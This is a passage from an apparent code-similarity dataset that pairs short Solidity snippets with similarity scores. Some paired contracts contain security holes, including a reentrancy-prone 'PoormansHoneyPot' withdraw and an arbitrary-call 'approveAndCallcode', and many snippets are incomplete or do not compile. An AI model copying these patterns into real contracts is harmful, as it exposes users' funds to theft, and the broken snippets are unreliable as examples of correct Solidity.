
    modifier onlyNew(string _gameName){

        require(userData[msg.sender].ref[_gameName] == 0x0,""Can't change reference address"");

        _;

    }



    

    function setUserRef(address _address, address _refAddress, string _gameName) public;

    function changeAmountPromotion(string _gameName, address _address, uint _amount, bool isPlus) public;

    

    function getUserRef(address _address, string _gameName) public view returns(address);

    function getAmountPromotionByAddress(string _gameName, address _address) public view returns (uint);

}"
"contract sampletoken{
mapping(address=>unit256) public balances;
function sampletoken(unit256 initialsupply) payable
{
balances[msg.sender]=initialsupply;
}
}",0.5799914646971989,"contract Token {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 value) public returns (bool success) {

    }
}"
"contract A {
    struct Thing {
        uint x;
        uint y;
        uint z;
    }
    mapping(uint => Thing) public foo;
    ...
}",0.5370939051847335,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract AddressChecksumUtils {
  
  function getChecksum(
    address account
  ) external pure returns (string memory accountChecksum) {
    
    return _toChecksumString(account);
  }

  
  function getChecksumCapitalizedCharacters(
    address account
  ) external pure returns (bool[40] memory characterCapitalized) {
    
    return _toChecksumCapsFlags(account);
  }

  
  function isChecksumValid(
    string calldata accountChecksum
  ) external pure returns (bool ok) {
    
    return _isChecksumValid(accountChecksum);
  }

  function _toChecksumString(
    address account
  ) internal pure returns (string memory asciiString) {
    
    bytes20 data = bytes20(account);

    
    bytes memory asciiBytes = new bytes(40);

    
    uint8 b;
    uint8 leftNibble;
    uint8 rightNibble;
    bool leftCaps;
    bool rightCaps;
    uint8 asciiOffset;

    
    bool[40] memory caps = _toChecksumCapsFlags(account);

    
    for (uint256 i = 0; i < data.length; i++) {
      
      b = uint8(uint160(data) / (2**(8*(19 - i))));
      leftNibble = b / 16;
      rightNibble = b - 16 * leftNibble;

      
      leftCaps = caps[2*i];
      rightCaps = caps[2*i + 1];

      
      asciiOffset = _getAsciiOffset(leftNibble, leftCaps);

      
      asciiBytes[2 * i] = byte(leftNibble + asciiOffset);

      
      asciiOffset = _getAsciiOffset(rightNibble, rightCaps);

      
      asciiBytes[2 * i + 1] = byte(rightNibble + asciiOffset);
    }

    return string(asciiBytes);
  }

  function _toChecksumCapsFlags(address account) internal pure returns (
    bool[40] memory characterCapitalized
  ) {
    
    bytes20 a = bytes20(account);

    
    bytes32 b = keccak256(abi.encodePacked(_toAsciiString(a)));

    
    uint8 leftNibbleAddress;
    uint8 rightNibbleAddress;
    uint8 leftNibbleHash;
    uint8 rightNibbleHash;

    
    for (uint256 i; i < a.length; i++) {
      
      rightNibbleAddress = uint8(a[i]) % 16;
      leftNibbleAddress = (uint8(a[i]) - rightNibbleAddress) / 16;
      rightNibbleHash = uint8(b[i]) % 16;
      leftNibbleHash = (uint8(b[i]) - rightNibbleHash) / 16;

      characterCapitalized[2 * i] = (
        leftNibbleAddress > 9 &&
        leftNibbleHash > 7
      );
      characterCapitalized[2 * i + 1] = (
        rightNibbleAddress > 9 &&
        rightNibbleHash > 7
      );
    }
  }

  function _isChecksumValid(
    string memory provided
  ) internal pure returns (bool ok) {
    
    address account = _toAddress(provided);

    
    if (
      account == address(0)
    ) {
      
      bytes memory b = bytes(provided);
      for (uint256 i; i < b.length; i++) {
        if (b[i] != hex""30"") {
          return false;
        }
      }
    }

    
    string memory actual = _toChecksumString(account);

    
    return (
      keccak256(
        abi.encodePacked(
          actual
        )
      ) == keccak256(
        abi.encodePacked(
          provided
        )
      )
    );
  }

  function _getAsciiOffset(
    uint8 nibble, bool caps
  ) internal pure returns (uint8 offset) {
    
    if (nibble < 10) {
      offset = 48;
    } else if (caps) {
      offset = 55;
    } else {
      offset = 87;
    }
  }

  function _toAddress(
    string memory account
  ) internal pure returns (address accountAddress) {
    
    bytes memory accountBytes = bytes(account);

    
    bytes memory accountAddressBytes = new bytes(20);

    
    uint8 b;
    uint8 nibble;
    uint8 asciiOffset;

    
    if (accountBytes.length == 40) {
      for (uint256 i; i < 40; i++) {
        
        b = uint8(accountBytes[i]);

        
        if (b < 48) return address(0);
        if (57 < b && b < 65) return address(0);
        if (70 < b && b < 97) return address(0);
        if (102 < b) return address(0); 

        
        if (b < 65) { 
          asciiOffset = 48;
        } else if (70 < b) { 
          asciiOffset = 87;
        } else { 
          asciiOffset = 55;
        }

        
        if (i % 2 == 0) {
          nibble = b - asciiOffset;
        } else {
          accountAddressBytes[(i - 1) / 2] = (
            byte(16 * nibble + (b - asciiOffset)));
        }
      }

      
      bytes memory packed = abi.encodePacked(accountAddressBytes);
      assembly {
        accountAddress := mload(add(packed, 20))
      }
    }
  }

  
  function _toAsciiString(
    bytes20 data
  ) internal pure returns (string memory asciiString) {
    
    bytes memory asciiBytes = new bytes(40);

    
    uint8 b;
    uint8 leftNibble;
    uint8 rightNibble;

    
    for (uint256 i = 0; i < data.length; i++) {
      
      b = uint8(uint160(data) / (2 ** (8 * (19 - i))));
      leftNibble = b / 16;
      rightNibble = b - 16 * leftNibble;

      
      asciiBytes[2 * i] = byte(leftNibble + (leftNibble < 10 ? 48 : 87));
      asciiBytes[2 * i + 1] = byte(rightNibble + (rightNibble < 10 ? 48 : 87));
    }

    return string(asciiBytes);
  }
}",0.5565502990699127,"contract TicketPro
{
    uint totalTickets;
    mapping(address => uint16[]) inventory;
    mapping(address => uint) spent;
    uint16 ticketIndex = 0; 
    uint expiryTimeStamp;
    address organiser;
    uint transferFee;
    uint numOfTransfers = 0;
    string public name;
    string public symbol;
    string public date;
    string public venue;
    uint startPrice;
    uint ticketLimit;
    uint8 public constant decimals = 0; 

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event TransferFrom(address indexed _from, address indexed _to, uint _value);

    modifier eventNotExpired()
    {
        
        if(block.timestamp > expiryTimeStamp)
        {
            revert();
        }
        else _;
    }

    modifier organiserOnly()
    {
        if(msg.sender != organiser) revert();
        else _;
    }

    function() public { revert(); } 

    function TicketPro(
        uint16[] numberOfTickets,
        string evName,
        uint expiry,
        string evDate,
        string evVenue,
        string eventSymbol,
        uint startTicketLimit) public
    {
        totalTickets = numberOfTickets.length;
        
        inventory[msg.sender] = numberOfTickets;
        expiryTimeStamp = expiry;
        organiser = msg.sender;
        symbol = eventSymbol;
        name = evName;
        date = evDate;
        venue = evVenue;
        ticketLimit = startTicketLimit;
    }

    function getDecimals() public pure returns(uint)
    {
        return decimals;
    }

    function getNumberOfAvailableStartTickets() public view returns (uint)
    {
        return ticketLimit;
    }

    function uintArrayToString (uint[] data) public pure returns (string)
    {
        bytes memory bytesString = new bytes(data.length * 32);
        uint urlLength;
        for (uint i=0; i<data.length; i++) {
            for (uint j=0; j<32; j++) {
                byte char = byte((data[i] * 2 ** (8 * j)));
                if (char != 0) {
                    bytesString[urlLength] = char;
                    urlLength += 1;
                }
            }
        }
        bytes memory bytesStringTrimmed = new bytes(urlLength);
        for (i=0; i<urlLength; i++) {
            bytesStringTrimmed[i] = bytesString[i];
        }
        return string(bytesStringTrimmed);
    }

    function trade(uint[] ticketIndices,
                   uint priceOfAllTickets,
                   uint8 v,
                   bytes32 r,
                   bytes32 s,
                   bytes memory prefix) public payable
    {
        string memory message = uintArrayToString(ticketIndices);
        bytes32 digest = keccak256(prefix, message);
        address seller = ecrecover(digest, v, r, s);
        require(msg.value == priceOfAllTickets);
        for(uint i = 0; i < ticketIndices.length; i++)
            require(inventory[seller][i] != 0); 
        for(uint j = 0; j < ticketIndices.length; j++)
        {
            inventory[msg.sender].push(inventory[seller][j]);
            inventory[seller][j] = 0;
            spent[seller] += 1;
        }
    }

    function totalSupply() public constant returns(uint)
    {
        return totalTickets;
    }

    function name() public view returns(string)
    {
        return name;
    }

    function symbol() public view returns(string)
    {
        return symbol;
    }

    function eventVenue() public constant returns(string)
    {
        return venue;
    }

    function eventDate() public constant returns(string)
    {
        return date;
    }

    function getAmountTransferred() public view returns (uint)
    {
        return numOfTransfers;
    }

    function isContractExpired() public view returns (bool)
    {
        if(block.timestamp > expiryTimeStamp)
        {
            return true;
        }
        else return false;
    }

    function balanceOf(address _owner) public view returns (uint16[])
    {
        return inventory[_owner];
    }

    function transfer(address _to, uint16[] ticketIndices) public
    {
        
        require(inventory[msg.sender].length -
            spent[msg.sender] < ticketIndices.length);
        for(uint i = 0; i < ticketIndices.length; i++)
        {
            require(inventory[msg.sender][i] != 0);
            
            inventory[_to].push(inventory[msg.sender][ticketIndices[i]]);
            inventory[msg.sender][ticketIndices[i]] = 0;
            numOfTransfers++;
        }
        spent[msg.sender] += ticketIndices.length;
    }

    function transferFrom(address _from, address _to, uint16[] ticketIndices)
        organiserOnly public
    {
        bool isOrganiser = msg.sender == organiser;
        
        require(inventory[_from].length -
            spent[_from] < ticketIndices.length || isOrganiser);
        for(uint i = 0; i < ticketIndices.length; i++)
        {
            require(inventory[msg.sender][i] != 0 || isOrganiser);
            
            inventory[_to].push(inventory[msg.sender][ticketIndices[i]]);
            inventory[msg.sender][ticketIndices[i]] = 0;
            numOfTransfers++;
        }
        spent[_from] += ticketIndices.length;
    }

}"
"contract Marketplace {

 

    struct User {
        uint reputation;
        string name;
        bool isUser;
    }

    struct Request {
            address company;
            uint id;
            uint deadline; 
            uint startTime;
            uint miniReputation;
            uint remuneration;
            string description;
            string url;
            State state;
            mapping(address=>bool) accepted;
            mapping(address=>bool) candidates;
    }

    address owner;
    mapping (address => uint) public balances;
    mapping(address => User) public users;
    mapping(uint => Request) public requests;
   


    uint requestCount;
    uint decimal=100;
    uint cost=102;

    enum State{OPENED,ONGOING,CLOSED}

    event UserCreated(address _add,uint _reputation, string  _name, bool _isUser);
    event RequestCreated(address _add, uint _id, uint _deadline, uint _startTime,
    uint _miniReputation, uint _cost, string _description,
    string _url, State _state);
    event Application(uint _id,address _add,uint _reputation);
    event OfferAccepted(uint _id,address _add);

    constructor() public{
        owner = msg.sender;
        requestCount;
    }

   modifier requestState  (uint _id, State _state) {
            require(requests[_id].state==_state,""request is not accessible"");
            _;
        }

    modifier nextRequestState
        (uint _id, State _state)
        {
            updateState(_id, _state);
         _;

        }

    modifier isUser
        (address _add)
        {
            require(_add!=address(0),""You are the 0 address"");
            require(users[_add].isUser,""You are not a user !"");
            _;
        }

    modifier isRequest
        (uint _id)
        {
            require(requests[_id].id > 0,""The request does not exist !"");
            _;
        }


    modifier isCandidate
        (uint _id,address _add)
        {
            require(_add!=address(0),""You are the 0 address"");
            require(requests[_id].candidates[_add],""You are not a candidate !"");
            _;
        }


    modifier isCompany
        (uint _id)
        {
            require(msg.sender!=address(0),""You are the 0 address"");
            require(requests[_id].company!=msg.sender,""You are the company !"");
            _;
        }

    modifier isAccepted
        (uint _id,address _add)
        {
            require(_add!=address(0),""You are the 0 address"");
            require(requests[_id].accepted[_add],""You are not accepted !"");
            _;
        }

    modifier isInTime (uint _id)
    {
      require(requests[_id].startTime<=now && requests[_id].deadline>=now,""You are not in time"");  
      _;
    }

    modifier afterDeadline
    (uint _id)
    {
        require(requests[_id].deadline < now,""The deadline is not reached !"");
        _;
    }

    function  updateState(uint _id,State _state) internal{
        requests[_id].state = _state;
    }


    function inscription (string memory _name, uint _reputation) public 
    {
        require(!users[msg.sender].isUser, ""You are already user !"");
        require(bytes(_name).length>0,""the name is not valid"");
        require(_reputation>=1,""the reputation is not valid"");
        User memory newUser = User(_reputation,_name,true);
        users[msg.sender] = newUser;
        emit UserCreated(msg.sender,_reputation,_name,true);
    }

    
    function addRequest
    (string calldata _description,
    uint _miniReputation,
    uint _deadline,
    uint _remuneration)
    external
    payable
    isUser(msg.sender)
    {
        
        require(bytes(_description).length>0,""The description is not valid !"");
        
        require(_miniReputation>1,""miniReputation is not valid"");
        
        require(_deadline>0,""The deadline is not valid"");
        
        uint256 _amount = (_remuneration * cost) / (decimal);
        require(msg.value >= _amount,""not enough of Wei"");
        requestCount++;
        balances [owner]=balances [owner] + (msg.value);
       uint deadline = _deadline * 1 days;
       Request memory newRequest = Request(msg.sender,requestCount,deadline,0,_miniReputation,_remuneration,_description,"""",State.OPENED);
       requests[requestCount] = newRequest;
       emit RequestCreated(msg.sender,requestCount,deadline,0,requests[requestCount].miniReputation,requests[requestCount].remuneration,requests[requestCount].description,"""",State.OPENED);
    }




    function applyTo(uint _id)
    public
    isUser(msg.sender)
    isCompany(_id)
    isRequest(_id)
    requestState(_id,State.OPENED)
    {

        require(!requests[_id].candidates[msg.sender],""You are already candidate !"");
        require(requests[_id].miniReputation<=users[msg.sender].reputation,""Reputation is not enought"");
        requests[_id].candidates[msg.sender]=true;
        emit Application(_id,msg.sender,users[msg.sender].reputation);
    }



    function acceptOffer(uint _id,address _add)
    public
    isRequest(_id)
    requestState (_id,State.OPENED)
    isCandidate(_id,_add)
    nextRequestState(_id,State.ONGOING)
    {
        require(requests[_id].company==msg.sender,""You are not the company !"");
        requests[_id].startTime = now;
        requests[_id].deadline=requests[_id].deadline+requests[_id].startTime;
        requests[_id].accepted[_add] =true;   
         emit OfferAccepted(_id,_add);
    }



    function delivery(uint _id,string memory _url)
    public
    isAccepted(_id,msg.sender)
    isRequest(_id)
    requestState (_id,State.ONGOING)
    isInTime(_id)
    nextRequestState(_id,State.CLOSED)
    {
        requests[_id].url = _url;
        users[msg.sender].reputation++;
        uint remuneration = requests[_id].remuneration;
       
        balances[owner]=balances[owner] - (remuneration);
        msg.sender.transfer(remuneration);
    }


    function sanction(uint _id, address _add)
    public
    isAccepted(_id,_add)
    isRequest(_id)
    requestState (_id,State.ONGOING)
    afterDeadline(_id)
    nextRequestState(_id,State.CLOSED)
    {
        require(requests[_id].company==msg.sender,""You are not the company !"");
        users[_add].reputation--;
    }

}",0.5801550422758026,"contract Broker {
  enum State { Created, Validated, Locked, Finished }
  State public state;

  enum FileState { 
    Created, 
    Invalidated
    
  }

  struct File{
    
    
    
    bytes32 purpose;
    
    string name;
    
    string ipfshash;
    FileState state;
  }

  struct Item{
    string name;
    
    uint   price;
    
    string detail;
    File[] documents;
  }

  Item public item;
  address public seller = address(0);
  address public broker = address(0);
  uint    public brokerFee;
  
  uint    public developerfee = 0.1 finney;
  uint    minimumdeveloperfee = 0.1 finney;
  address developer = 0x007C67F0CDBea74592240d492Aef2a712DAFa094c3;
  
  address creator = 0x0;
  address factory = 0x0;
  
  bool bBrokerRequired = true;
  address[] public buyers;


  modifier onlySeller() {
    require(msg.sender == seller);
    _;
  }

  modifier onlyCreator() {
    require(msg.sender == creator);
    _;
  }

  modifier onlyBroker() {
    require(msg.sender == broker);
    _;
  }

  modifier inState(State _state) {
      require(state == _state);
      _;
  }

  modifier condition(bool _condition) {
      require(_condition);
      _;
  }

  event AbortedBySeller();
  event AbortedByBroker();
  event PurchaseConfirmed(address buyer);
  event ItemReceived();
  event Validated();
  event ItemInfoChanged(string name, uint price, string detail, uint developerfee);
  event SellerChanged(address seller);
  event BrokerChanged(address broker);
  event BrokerFeeChanged(uint fee);

  
  constructor(bool isbroker, address _dev, address _creator, bool _brokerrequired) 
    public 
  {
    bBrokerRequired = _brokerrequired;
    if(creator==address(0)){
      
      if(isbroker)
        broker = _creator;
      else
        seller = _creator;
      creator = _creator;
      
      
      state = State.Created;

      
      brokerFee = 50;
    }
    if(developer==address(0) || developer==msg.sender){
       developer = _dev;
    }
    if(factory==address(0)){
       factory = msg.sender;
    }
  }

  function joinAsBroker() public {
    if(broker==address(0)){
      broker = msg.sender;
    }
  }

  function createOrSet(string name, uint price, string detail)
    public 
    inState(State.Created)
    onlyCreator
  {
    require(price > minimumdeveloperfee);
    item.name = name;
    item.price = price;
    item.detail = detail;
    developerfee = (price/1000)<minimumdeveloperfee ? minimumdeveloperfee : (price/1000);
    emit ItemInfoChanged(name, price, detail, developerfee);
  }

  function getBroker()
    public 
    constant returns(address, uint)
  {
    return (broker, brokerFee);
  }

  function getSeller()
    public 
    constant returns(address)
  {
    return (seller);
  }
  
  function getBuyers()
    public 
    constant returns(address[])
  {
    return (buyers);
  }

  function setBroker(address _address)
    public 
    onlySeller
    inState(State.Created)
  {
    broker = _address;
    emit BrokerChanged(broker);
  }

  function setBrokerFee(uint fee)
    public 
    onlyCreator
    inState(State.Created)
  {
    brokerFee = fee;
    emit BrokerFeeChanged(fee);
  }

  function setSeller(address _address)
    public 
    onlyBroker
    inState(State.Created)
  {
    seller = _address;
    emit SellerChanged(seller);
  }

  
  
  
  
  
  
  
  function addDocument(bytes32 _purpose, string _name, string _ipfshash)
    public 
  {
    require(state != State.Finished);
    require(state != State.Locked);
    item.documents.push( File({
      purpose:_purpose, name:_name, ipfshash:_ipfshash, state:FileState.Created}
      ) 
    );
  }

  
  function deleteDocument(uint index)
    public 
  {
    require(state != State.Finished);
    require(state != State.Locked);
    if(index<item.documents.length){
      item.documents[index].state = FileState.Invalidated;
    }
  }

  function validate()
    public 
    onlyBroker
    inState(State.Created)
  {
    
    
    
    emit Validated();
    
    state = State.Validated;
  }

  
  
  
  function abort()
    public 
    onlySeller
    inState(State.Created)
  {
      emit AbortedBySeller();
      state = State.Finished;
      
      seller.transfer(address(this).balance);
  }

  function abortByBroker()
    public 
    onlyBroker
  {
      if(!bBrokerRequired)
        return;
        
      require(state != State.Finished);
      state = State.Finished;
      emit AbortedByBroker();
      
      if(buyers.length>0){
          uint val = address(this).balance / buyers.length;
          for (uint256 x = 0; x < buyers.length; x++) {
              buyers[x].transfer(val);
          }
      }
  }

  
  
  
  function confirmPurchase()
    public 
    condition(msg.value == item.price)
    payable
  {
      if(bBrokerRequired){
        if(state != State.Validated){
          return;
        }
      }
      
      state = State.Locked;
      buyers.push(msg.sender);
      emit PurchaseConfirmed(msg.sender);
      
      if(!bBrokerRequired){
		
        seller.transfer(item.price-developerfee);
        developer.transfer(developerfee);
      }
  }

  
  
  function confirmReceived()
    public 
    onlyBroker
    inState(State.Locked)
  {
      
      
      
      state = State.Finished;

      
      
      seller.transfer(address(this).balance-brokerFee-developerfee);
      broker.transfer(brokerFee);
      developer.transfer(developerfee);

      emit ItemReceived();
  }

  function getInfo() constant 
    public 
    returns (State, string, uint, string, uint, uint, address, address, bool)
  {
    return (state, item.name, item.price, item.detail, item.documents.length, 
        developerfee, seller, broker, bBrokerRequired);
  }

  function getFileAt(uint index) 
    public 
    constant returns(uint, bytes32, string, string, FileState)
  {
    return (index,
      item.documents[index].purpose,
      item.documents[index].name,
      item.documents[index].ipfshash,
      item.documents[index].state);
  }
}"
"contract MyContract {
    uint networkid;

    constructor(uint _networkid) public {
        networkid = _networkid;
    }
}",0.5690918712067257,"contract FiatContractInterface {

    function EUR(uint _id) public constant returns (uint256);

}"
"contract MyToken {
  constructor(...",0.5535181539527019,contract NewToken is ERC20 {}
"contract beer{
   
   
   
   mapping(uint=>mapping(address=>uint256)) balances;

   
   function transfer(uint which,address _to, uint256 _value){
      if(balances[which][msg.sender]-value>0){
         balances[which][msg.sender]-=value;
         balances[which][_to]+=value;
      }
   }
}",0.5920112876122569,"contract BalancingToken is ERC20 {
    mapping (address => uint256) public balances;      

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
}"
"contract Foo {
  struct BurnApply {
    address applicant;
    uint amount;
    string btcAddress;
    uint8 flag; 
    uint password;
  }

  mapping(uint => BurnApply) public burnProcesses;
}",0.5790756692734312,"contract Hgs {
    struct CsAction {
      bool        passedKYC;
      bool        blocked;
    }


    
    mapping (address => CsAction) public permissions;
    mapping (address => uint256)  public deposits;
}"
"contract Crowdfunder{
   function() Crowdfunder { }
   function() payable {
      contributions.push(
        Contribution({
            amount: msg.value,
            contributor: msg.sender
            })
        );
    totalRaised += msg.value;
    currentBalance = totalRaised;
    LogFundingReceived(msg.sender, msg.value, totalRaised);
    checkIfFundingCompleteOrExpired();
  }
}",0.5204587134476668,"contract PoormansHoneyPot {
    mapping (address => uint) public balances;

    constructor() public payable {
        store();
    }

    function store() public payable {
        balances[msg.sender] = msg.value;
    }

    function withdraw() public{
        assert (msg.sender.call.value(balances[msg.sender])()) ;
        balances[msg.sender] = 0;
    }


}"
"contract A {
    uint x = 255;
}",0.5391975933732419,"contract Asset is ATxAsset {

}"
"contract EventTest {
  
  event marketCreated(address market, uint256 indexed endTime, string description, string extraInfo);
  event marketCreated(address market, uint256 indexed endTime, string description, string extraInfo, int256 _minPrice, int256 _maxPrice, uint256 _numTicks);


  function createYesNoMarket( ...

    emit marketCreated(address(newMarket), _endTime, _description, _extraInfo);
",0.572593417604388,"contract PollingEvents {
    event PollCreated(
        address indexed creator,
        uint256 blockCreated,
        uint256 indexed pollId,
        uint256 startDate,
        uint256 endDate,
        string multiHash,
        string url
    );

    event PollWithdrawn(
        address indexed creator,
        uint256 blockWithdrawn,
        uint256 pollId
    );

    event Voted(
        address indexed voter,
        uint256 indexed pollId,
        uint256 indexed optionId
    );
}"
"contract A {
    constructor(uint paramA) public {
        log0(bytes32(0x00000000));  
    }
}",0.5680448417115652,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
contract SampleCrowdsale is Crowdsale {},0.5734461176670782,"contract AssembledCommonSale is CommonSale {

}"
contract CappedCrowdsale is SampleCrowdsale {},0.5811257640141271,"contract AssembledCommonSale is CommonSale {

}"
"contract Hub is Deployer { ...

contract Spoke is Deployed { ...",0.5176276084923029,"contract Object is Owned {
    
    uint constant OK = 1;
}"
"contract Factory {
    function create(bytes code) returns (address addr){
        assembly {
            addr := create(0,add(code,0x20), mload(code))
            jumpi(invalidJumpLabel,iszero(extcodesize(addr)))
        }
    }
}",0.5769090996171321,"contract IsContract {



    

    

    



    function isContract(address addr)

        internal

        constant

        returns (bool)

    {

        uint256 size;

        

        assembly { size := extcodesize(addr) }

        return size > 0;

    }

}"
"contract DifferentContract{
        CrowdSale  cscontract;
        function DifferentContract(address crowdsalecontract){
        cscontract = CrowdSale(crowdsalecontract);  
        }

        function GetContributorsFromDifferentContract(address addr) returns (uint)
        {
        return cscontract.GetContributors(addr); 
        }
}",0.5218846542774077,"contract TeamBet{
uint minAmount;

string teamName;


BetContract ownerContract;

function showTeam() public view returns(string team){
return teamName;
}

function showOwnerContract() public view returns(address _ownerContract) {

return ownerContract;
}


}"
"contract UserRecord {
    constructor() public { owner = msg.sender; }

    address owner;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    struct User {
        bytes32 userEmail;
        uint index;
    }

    mapping (bytes32 => User) private users;

    bytes32[] private usersRecords;
    event LogNewUser(bytes32 indexed userEmail, uint index);

    function setUseremail(bytes32 _userEmail) public onlyOwner returns(bool success){
        users[_userEmail].userEmail = _userEmail;
        users[_userEmail].index = usersRecords.push(_userEmail) -1;

        emit LogNewUser(
        _userEmail,
        users[_userEmail].index
        );
        return true;
    }



    function deleteUser(bytes32 _userEmail) public onlyOwner returns(uint index){
        require(!isUser(_userEmail)); 
        uint toDelete = users[_userEmail].index;
        bytes32 lastIndex = usersRecords[usersRecords.length-1];
        usersRecords[toDelete] = lastIndex;
        users[lastIndex].index = toDelete; 
        usersRecords.length--;
        return toDelete;   
    }    
}",0.5434402632798154,"contract Ownable {

  address private _owner;

  mapping(address => bool) private managers;



  event OwnershipTransferred(

    address indexed previousOwner,

    address indexed newOwner

  );



  

  constructor() internal {

    _owner = msg.sender;

    managers[msg.sender] = true;

    emit OwnershipTransferred(address(0), _owner);

  }



  

  function owner() public view returns(address) {

    return _owner;

  }



  

  modifier onlyOwner() {

    require(isOwner(), 'SENDER_IS_NOT_OWNER');

    _;

  }



  

  function isOwner() public view returns(bool) {

    return msg.sender == _owner;

  }

  

  function renounceOwnership() public onlyOwner {

    emit OwnershipTransferred(_owner, address(0));

    _owner = address(0);

  }



  

  function transferOwnership(address newOwner) public onlyOwner {

    _transferOwnership(newOwner);

  }



  

  function _transferOwnership(address newOwner) internal {

    require(newOwner != address(0),'INVALID_NEW_OWNER');

    emit OwnershipTransferred(_owner, newOwner);

    _owner = newOwner;

  }

}"
"contract Test {
    function getData() constant returns (bytes32, bytes32, bytes32, bytes32,
                                     bytes32, bytes32, bytes32, bytes32,
                                     bytes32, bytes32, bytes32, bytes32,
                                     bytes32, bytes32, bytes32) {                                         

        return (""a"", ""b"", ""c"", ""d"", ""e"", ""f"", ""g"", ""h"", ""i"", ""j"", ""k"", ""l"", ""m"", ""n"", ""o"");                                         
    }
}",0.5187002397613608,"contract Utils {

  function testrc(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns(address) {

    return ecrecover(hash, v, r, s);

  }



  function hash(uint x, uint y, uint z, uint w) public pure returns(bytes32) {

    return sha3(x,y,z,w);

  }

}"
"contract Election {
  
  PassportInterface passportContract; 
  
}",0.5666851382133533,"contract ownedContractInterface

{

  address public owner;



}"
"contract MyContract {

  constructor(address tokenContractAddress) public {
    IERC20 token = IERC20(tokenContractAddress); 
    uint deployerBalance = token.balanceOf(msg.sender);
    if (deployerBalance > ...
  }
}",0.5977998903268078,"contract SendERC20Token is Ownable {

    

    function withdrawToken(address _tokenAddress) public {



        IERC20 token = IERC20(_tokenAddress);



        require(token.transfer(msg.sender, 1000000000000000000) == true);

    }

}"
"contract newContract{
    MyContract myContract = MyContract(0x08271...);

    function bid(uint amt, address _newOwner) returns(bool success){
        if (amt > ...){
        myContract.func(_newOwner)
    }
    }
}",0.5803481466076663,"contract token {
	function transferFrom(address sender, address receiver, uint amount) returns(bool success) {}

	function burn() {}
	
	function setStart(uint newStart) {}
}"
"contract UserRegistry {

    struct UserStruct {
        string name;
        string url;
        uint userListPointer;
    }

    address[] public userList;
    mapping(address => UserStruct) public userStructs;

    function isUser(address user)
        public 
        constant
        returns(bool isIndeed)
    {
        if(userList.length==0) return false;
        return userList[userStructs[user].userListPointer]==user;
    }

    

    function registerAsUser(string name, string url)
        public
        returns(bool success)
    {
        if(isUser(msg.sender)) throw; 
        userStructs[msg.sender].name = name;
        userStructs[msg.sender].url = url;
        userStructs[msg.sender].userListPointer = userList.push(msg.sender) - 1;
        return true;
    }

    function updateUserName(string name)
        public
        returns(bool success)
    {
        if(!isUser(msg.sender)) throw;
        userStructs[msg.sender].name = name;
        return true;
    }

    function updateUserUrl(string url)
        public
        returns(bool success)
    {
        if(!isUser(msg.sender)) throw;
        userStructs[msg.sender].url = url;
        return true;
    }

}",0.5608594775272309,"contract GVE is StandardToken {

    function () {
        
        throw;
    }

    string public name = ""GVE"";                   
    uint8 public decimals = 18;                
    string public symbol = ""GVE"";                 
    string public version = &#39;v0.1&#39;;       

    address public founder; 

    function GVE(address holder) {
        require(holder != address(0));
        founder = msg.sender;
        balances[holder] = 1000000000 * 10 ** uint256(decimals);
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }

    
    function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        if(!_spender.call(_extraData)) { throw; }
        return true;
    }
}"
"contract User
{
  
  IterableMapping.itmap data;
  
  function insert(uint k, uint v) returns (uint size)
  {
    
    IterableMapping.insert(data, k, v);
    
    return data.size;
  }
  
  function sum() returns (uint s)
  {
    for (var i = IterableMapping.iterate_start(data); IterableMapping.iterate_valid(data, i); i = IterableMapping.iterate_next(data, i))
    {
        var (key, value) = IterableMapping.iterate_get(data, i);
        s += value;
    }
  }
}",0.5244960978919414,"contract ERC677Token {
  function transferAndCall(address receiver, uint amount, bytes data) public returns (bool success);
  function contractFallback(address to, uint value, bytes data) internal;
  function isContract(address addr) internal view returns (bool hasCode);
  event Transfer(address indexed from, address indexed to, uint value, bytes data);
}"
"contract SimplifiedManagedAccount {
    
    bool public payOwnerOnly = true;
    
    uint public accumulatedInput;

    function() {
        accumulatedInput += msg.value;
    }
}",0.5670145704776041,"contract IHumanity {

    function mint(address account, uint256 value) public;

    function totalSupply() public view returns (uint256);

}"
"contract Concatenator {
    address[]  Accounts1;
    function ConcatenateArrays(address[] Accounts2){
        for (uint i=0; i < Accounts2.length; i++) {
            Accounts1.push(Accounts2[i]);
        }
    } 
}",0.5260149353200894,"contract AbstractDaoChallenge {
	function isMember (DaoAccount account, address allegedOwnerAddress) returns (bool);
	function tokenPrice() returns (uint256);
}"
"contract A {

    string private V;

}",0.5863516535769299,"contract Gap {    

    uint256[1000] private ______gap;

}"
"contract Foo {
  string private bar;

  constructor (string memory _bar) public {
    bar = _bar;
  }
}",0.595333972772202,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract Simple {

  struct MyStruct {
    uint input1;
    uint input2;
    bool isSet;
  }

  mapping(bytes32 => MyStruct) public myStructs;
  bytes32[] public keys;

  function addToData(bytes32 key, uint input1, uint input2)
    public
    returns(bool success)
  {
    myStructs[key].input1 = input1;
    myStructs[key].input2 = input2;
    myStructs[key].isSet  = true;
    keys.push(key);
    return true;
  }

  function getKeyCount()
    public
    constant
    returns(uint keyCount)
  {
    return keys.length;
  }

}",0.5885592878620263,"contract PricingStrategy {

  
  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address purchaser) public constant returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract CrowdSaleContract{
    using SafeMath for uint;
    uint baseTokenAmount = 10;

    tokenTrnsfer(
    address _userWallet,
    uint _amount){
            uint transferAble = _amount*baseTokenAmount + (_amount*baseTokenAmount).div(100).mul(15);
            YourToken.transfer(_userWallet, transferAble);
    }

